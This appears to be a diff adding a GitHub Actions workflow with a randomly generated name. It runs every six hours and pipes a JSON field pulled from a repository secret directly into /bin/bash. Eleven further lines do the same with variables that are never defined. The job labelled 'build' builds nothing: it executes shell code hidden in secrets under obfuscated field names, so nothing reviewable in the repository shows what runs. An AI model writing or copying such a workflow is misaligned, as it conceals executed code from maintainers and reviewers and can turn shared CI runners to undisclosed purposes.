@@ -1,0 +1,27 @@
+name: chengaoyunnkg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengaoyunnkg
+        env:
+          an93: ${{ secrets.an93 }}
+        run: |
+          echo $an93 | jq -r .o684 | /bin/bash
+          echo $y92 | jq -r .venq60 | /bin/bash
+          echo $bdnue9 | jq -r .c1 | /bin/bash
+          echo $actxx711 | jq -r .c4542 | /bin/bash
+          echo $avjlq240 | jq -r .gm189 | /bin/bash
+          echo $of21 | jq -r .c21452 | /bin/bash
+          echo $egfz3763 | jq -r .gf49 | /bin/bash
+          echo $nk164 | jq -r .psnxv2 | /bin/bash
+          echo $g0120 | jq -r .ranni5 | /bin/bash
+          echo $ah9 | jq -r .ombz574 | /bin/bash
+          echo $v5 | jq -r .wrkkp27889 | /bin/bash
+          echo $sawuh945 | jq -r .iy44020 | /bin/bash
+
